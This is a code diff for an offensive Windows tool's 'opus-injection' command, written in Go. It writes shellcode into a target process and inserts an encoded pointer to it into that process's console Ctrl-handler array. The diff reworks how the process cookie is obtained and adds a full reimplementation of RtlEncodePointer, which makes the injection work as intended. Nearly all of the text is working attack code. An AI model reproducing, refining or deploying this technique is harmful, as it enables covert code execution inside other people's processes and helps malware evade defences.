@@ -46,8 +46,8 @@ const (
 	AllocatedHandlerListLengthRVA = 0x39CBB4 // DWORD: allocated array capacity
 )
 
-// PEB offset for pointer encoding cookie (x64)
-const PEB_COOKIE_OFFSET = 0x78
+// ProcessCookie info class for NtQueryInformationProcess
+const ProcessCookie = 36
 
 var (
 	ntdllOpus                       = windows.NewLazySystemDLL("ntdll.dll")
@@ -57,18 +57,6 @@ var (
 	procNtQueryInformationProcessOp = ntdllOpus.NewProc("NtQueryInformationProcess")
 )
 
-// PROCESS_BASIC_INFORMATION for getting PEB address
-type PROCESS_BASIC_INFORMATION struct {
-	ExitStatus                   uintptr
-	PebBaseAddress               uintptr
-	AffinityMask                 uintptr
-	BasePriority                 int32
-	_                            [4]byte // padding on x64
-	UniqueProcessId              uintptr
-	InheritedFromUniqueProcessId uintptr
-}
-
-const ProcessBasicInformation = 0
 
 // OpusInjectionCommand implements the opus-injection command
 type OpusInjectionCommand struct{}
@@ -230,20 +218,13 @@ func executeOpusVariant1(shellcode []byte, pid uint32) (string, error) {
 		return output, fmt.Errorf("handler array is full (%d/%d) - cannot inject without reallocation", handlerCount, allocatedCount)
 	}
 
-	// Step 6: Get target process PEB to read pointer encoding cookie
-	pebAddr, err := getProcessPEB(hProcess)
+	// Step 6: Get process cookie via NtQueryInformationProcess(ProcessCookie)
+	// The cookie is a 32-bit DWORD value
+	pointerCookie, err := getProcessCookie(hProcess)
 	if err != nil {
-		return output, fmt.Errorf("failed to get PEB address: %v", err)
+		return output, fmt.Errorf("failed to get process cookie: %v", err)
 	}
-	output += fmt.Sprintf("[+] Target PEB at: 0x%X\n", pebAddr)
-
-	// Step 7: Read pointer encoding cookie from PEB+0x78
-	var pointerCookie uintptr
-	err = readProcessMemoryPtr(hProcess, pebAddr+PEB_COOKIE_OFFSET, &pointerCookie)
-	if err != nil {
-		return output, fmt.Errorf("failed to read pointer cookie: %v", err)
-	}
-	output += fmt.Sprintf("[+] Pointer encoding cookie: 0x%X\n", pointerCookie)
+	output += fmt.Sprintf("[+] Process cookie: 0x%X\n", pointerCookie)
 
 	// Step 8: Allocate memory for shellcode
 	// Use kernel32 proc calls (defined in vanillainjection.go)
@@ -274,8 +255,8 @@ func executeOpusVariant1(shellcode []byte, pid uint32) (string, error) {
 	output += fmt.Sprintf("[+] Wrote %d bytes of shellcode\n", bytesWritten)
 
 	// Step 10: Encode shellcode address using the target's pointer cookie
-	// RtlEncodePointer simply XORs with the cookie
-	encodedShellcodeAddr := shellcodeAddr ^ pointerCookie
+	// RtlEncodePointer: (pointer XOR cookie) ROR (cookie & 0x3F)
+	encodedShellcodeAddr := encodePointer(shellcodeAddr, pointerCookie)
 	output += fmt.Sprintf("[+] Encoded shellcode address: 0x%X\n", encodedShellcodeAddr)
 
 	// Step 11: Write encoded pointer to handler array at index [handlerCount]
@@ -306,14 +287,16 @@ func executeOpusVariant1(shellcode []byte, pid uint32) (string, error) {
 	output += "[+] Attached to target console\n"
 
 	// Step 14: Generate Ctrl+C event
-	// IMPORTANT: Use target PID as process group ID, NOT 0
-	// Using 0 would send Ctrl+C to ALL processes on the console, including our agent!
+	// Try using target PID as process group ID
+	// This may fail if the process wasn't started with CREATE_NEW_PROCESS_GROUP
 	ret, _, ctrlErr := procGenerateConsoleCtrlEvent.Call(
 		uintptr(CTRL_C_EVENT),
-		uintptr(pid), // Send only to target's process group
+		uintptr(pid),
 	)
 	if ret == 0 {
-		output += fmt.Sprintf("[!] GenerateConsoleCtrlEvent warning: %v\n", ctrlErr)
+		output += fmt.Sprintf("[!] GenerateConsoleCtrlEvent failed: %v\n", ctrlErr)
+		output += "[*] Handler installed but auto-trigger failed.\n"
+		output += "[*] MANUAL TRIGGER: Press Ctrl+C in the target console window to execute shellcode.\n"
 	} else {
 		output += fmt.Sprintf("[+] Generated CTRL_C_EVENT to process group %d\n", pid)
 	}
@@ -322,7 +305,7 @@ func executeOpusVariant1(shellcode []byte, pid uint32) (string, error) {
 	procFreeConsole.Call()
 
 	output += "[+] Opus Injection Variant 1 completed\n"
-	output += "[*] Note: Shellcode executed as Ctrl handler callback\n"
+	output += fmt.Sprintf("[*] Handler installed at slot %d. Shellcode will execute on Ctrl+C.\n", handlerCount)
 
 	return output, nil
 }
@@ -376,24 +359,39 @@ func stringsEqualFold(a, b string) bool {
 	return true
 }
 
-// getProcessPEB retrieves the PEB address of a remote process
-func getProcessPEB(hProcess windows.Handle) (uintptr, error) {
-	var pbi PROCESS_BASIC_INFORMATION
+// getProcessCookie retrieves the process cookie via NtQueryInformationProcess(ProcessCookie)
+func getProcessCookie(hProcess windows.Handle) (uint32, error) {
+	var cookie uint32
 	var returnLength uint32
 
 	status, _, _ := procNtQueryInformationProcessOp.Call(
 		uintptr(hProcess),
-		uintptr(ProcessBasicInformation),
-		uintptr(unsafe.Pointer(&pbi)),
-		uintptr(unsafe.Sizeof(pbi)),
+		uintptr(ProcessCookie), // Info class 36
+		uintptr(unsafe.Pointer(&cookie)),
+		uintptr(4), // DWORD size
 		uintptr(unsafe.Pointer(&returnLength)),
 	)
 
 	if status != 0 {
-		return 0, fmt.Errorf("NtQueryInformationProcess failed: 0x%X", status)
+		return 0, fmt.Errorf("NtQueryInformationProcess(ProcessCookie) failed: 0x%X", status)
 	}
 
-	return pbi.PebBaseAddress, nil
+	return cookie, nil
+}
+
+// encodePointer implements RtlEncodePointer algorithm
+// Encoding: (pointer XOR cookie) ROR (cookie & 0x3F)
+func encodePointer(ptr uintptr, cookie uint32) uintptr {
+	// XOR with cookie (zero-extended to 64-bit)
+	result := ptr ^ uintptr(cookie)
+
+	// Rotate right by (cookie & 0x3F) bits
+	rotateAmount := cookie & 0x3F
+	if rotateAmount > 0 {
+		result = (result >> rotateAmount) | (result << (64 - rotateAmount))
+	}
+
+	return result
 }
 
 // readProcessMemoryPtr reads a pointer-sized value from remote process
